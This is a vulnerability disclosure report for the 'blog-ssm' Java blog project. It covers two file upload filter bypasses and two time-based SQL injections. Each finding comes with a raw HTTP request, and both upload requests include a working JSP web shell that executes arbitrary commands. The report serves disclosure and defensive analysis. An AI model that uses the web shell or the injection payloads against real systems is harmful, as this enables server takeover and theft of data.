# Project

Address: [blog-ssm](https://github.com/rawchen/blog-ssm)

# 1. File upload vulnerability

## 1.1 File upload vulnerability `/upFile`

[Suggested description]

Because the logic of file upload defense in the code is not strict, attackers can directly bypass the restriction and upload malicious files, which further damages the system

[Vendor of Product]

https://github.com/rawchen/blog-ssm/tree/b3608ba9c845a67d3aaa8c1a19773f64c552b6c4

[Affected Product Code Base]

Nov 27, 2022 -- Jan 8, 2024(Now)

[Affected Component]

 `/upFile`

[The payload]

```
POST /upFile HTTP/1.1
Host: localhost:8080
Content-Length: 581
Cache-Control: max-age=0
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="104"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybJL1FkiNtkEJQlf6
Cookie: JSESSIONID=9D9556D59CFC9DAD6338357FD5449AF9
Connection: close

------WebKitFormBoundarybJL1FkiNtkEJQlf6
Content-Disposition: form-data; name="editormd-image-file"; filename="hello.jsp::$DATA"
Content-Type: image/png

<%
    if("20240115".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
------WebKitFormBoundarybJL1FkiNtkEJQlf6--
```


[Vulnerability recurrence]

The trigger point of the vulnerability is in the "Post blog" -> "Add image"

![688b7b89dd6ef86592137969747e292](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/2d65672c-fb8a-4f35-a5fd-36c8f3ce0ebd)

![7ac276542af520e35d6969fd137ee6c](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/78696856-023a-4819-9aa2-9a68d2f7f4f6)

Upload a malicious jsp file: 

![6ddf5489fb815f5a41fbd0fac4c8346](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/d9cffb9a-1353-4b02-b1e9-c388689433c1)

![9ec82c6a24b1f68b1ea42aec8f5581d](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/67e3048f-b8a4-40ac-9c9d-0c091eceb30e)

[Code analysis]

In the current version, file upload is restricted, and the original upload vulnerability is fixed, but the patch logic is not perfect, so it can lead to bypassing

[File upload vulnerability information of the previous version](https://github.com/rawchen/blog-ssm/issues/2)

[Patch information](https://github.com/rawchen/blog-ssm/commit/da643712a4db422122870810950e80fd522d2be3)

![cefb44fcecadd5fa494c22e87f5f138](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/5b99617d-8080-4ea1-a0b3-4627d1e8614e)

In the patch, simply by matching whether the suffix is 'jsp' or 'asp', an attacker can take advantage of a windows feature by changing the file suffix to `.jsp::$DATA` to bypass file upload restrictions.

![1705328179724](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/2819dd41-3ca8-4c8b-baf2-1be578ba1dfe)

![1705328249833](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/345106d2-f808-4443-8c82-ba8a77f2b3af)

![1705328265863](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/67182f9c-ccc2-44e5-b8f9-47d774db038b)


## 1.2 File upload vulnerability `/uploadFileList`

[Suggested description]

Because the logic of file upload defense in the code is not strict, attackers can directly bypass the restriction and upload malicious files, which further damages the system

[Vendor of Product]

https://github.com/rawchen/blog-ssm/tree/b3608ba9c845a67d3aaa8c1a19773f64c552b6c4

[Affected Product Code Base]

Nov 27, 2022 -- Jan 8, 2024(Now)

[Affected Component]

 `/uploadFileList`

[The payload]

```
POST /uploadFileList HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryN7zOcWJ6h1RRk1V7
X-Requested-With: XMLHttpRequest
Cookie: JSESSIONID=9D9556D59CFC9DAD6338357FD5449AF9
Connection: close
Content-Length: 564

------WebKitFormBoundaryN7zOcWJ6h1RRk1V7
Content-Disposition: form-data; name="files[]"; filename="test.jsp."
Content-Type: image/png

<%
    if("20240115".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
------WebKitFormBoundaryN7zOcWJ6h1RRk1V7--
```


[Vulnerability recurrence]

The trigger point of the vulnerability is in "File Management" --> "Upload"

![911bee459d7949dae431719260dd16a](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/c2560828-266b-4352-a282-400348165bd0)

![d195e941d07806c2274a2dbb0d87a30](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/8f7d1688-7d7b-4676-ba76-5d1323308da3)

Upload a malicious jsp file: 

![ecefe27bb5ff4fc5637b5243e68f04c](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/9715e703-0e61-45f7-8f38-7ce7046a8539)

![47dc9f921dbfe6a1c789d985c7ebe8e](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/f4fb9e6a-34d7-4582-b731-9aedcd197a87)

![296ae6b02314788ac57842deb335ff0](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/29246e0f-5e1a-4f7c-bd4d-55a312b4b364)

[Code analysis]

In the current version, file upload is restricted, and the original upload vulnerability is fixed, but the patch logic is not perfect, so it can lead to bypassing

[File upload vulnerability information of the previous version](https://github.com/rawchen/blog-ssm/issues/2)

[Patch information](https://github.com/rawchen/blog-ssm/commit/da643712a4db422122870810950e80fd522d2be3)

![cefb44fcecadd5fa494c22e87f5f138](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/5b99617d-8080-4ea1-a0b3-4627d1e8614e)

In the patch, simply by matching whether the suffix is 'jsp' or 'asp', an attacker can take advantage of a windows feature by changing the file suffix to `.jsp.` to bypass file upload restrictions.

![1705328022771](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/56040fb3-359b-472e-aa11-d04481b32ead)

![1705328061460](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/4d0ad8c5-42ea-4c47-8fdc-d88f255356d2)


# 2. SQL injection vulnerability

## 2.1 SQL injection vulnerability `/searchContent`

[Suggested description]

There is an SQL injection vulnerability at the search function that allows an attacker to launch an attack without logging on to the system.

[Vendor of Product]

https://github.com/rawchen/blog-ssm/tree/b3608ba9c845a67d3aaa8c1a19773f64c552b6c4

[Affected Product Code Base]

ALL

[Affected Component]

 `/searchContent`

[The payload]

```
POST /searchContent HTTP/1.1
Host: localhost:8080
Content-Length: 203
Content-Type: application/x-www-form-urlencoded
Connection: close

searchWord=%27%20%41%4e%44%20%28%53%45%4c%45%43%54%20%37%32%35%34%20%46%52%4f%4d%20%28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%77%45%48%6f%29%20%41%4e%44%20%27%4e%72%7a%44%27%3d%27%4e%72%7a%44
```

[Vulnerability recurrence]

Look for vulnerability triggers: 

![1705329031620](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/4311dc8c-dc12-43b1-8b4b-5835e8136f43)

![1705328869840](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/f3ab2195-6c87-45f4-804e-af96718f76bc)

Get the database user using sqlmap: 

![badadc86c5b7819306bd5b9905a6d3a](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/f515422f-bcde-468c-a19b-de40b613ba2d)

[Code analysis]

Concatenating SQL statements with `${` leads to an injection vulnerability: 

![1705329239535](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/91681add-c91b-451c-ae58-bae92e0a5886)


## 2.2 SQL injection vulnerability `/fuzzyQueryTag`

[Suggested description]

There is SQL injection in the interface '/fuzzyQueryTag', and the attacker does not need to log in to launch an attack on the system.

[Vendor of Product]

https://github.com/rawchen/blog-ssm/tree/b3608ba9c845a67d3aaa8c1a19773f64c552b6c4

[Affected Product Code Base]

ALL

[Affected Component]

 `/fuzzyQueryTag`

[The payload]

```
GET /fuzzyQueryTag?tagName=%27%20AND%20(SELECT%207530%20FROM%20(SELECT(SLEEP(5)))YQka)%20AND%20%27SUCu%27=%27SUC HTTP/1.1
Host: localhost:8080
Connection: close


```

[Vulnerability recurrence]

![0bb86f0acb9b09aecfa2b7346ebd1ed](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/c490bcae-dd81-4462-998c-a67726a5145b)

![b1934919fe00c77c465a3fca8d32e39](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/364423f7-2829-4336-9da6-c3b49f161bf1)

[Code analysis]

Concatenating SQL statements with `${` leads to an injection vulnerability: 

![f08b00c83f83ad02a5b04703ce04892](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/18fe74a2-5036-4ec0-bb23-543f4eaec751)


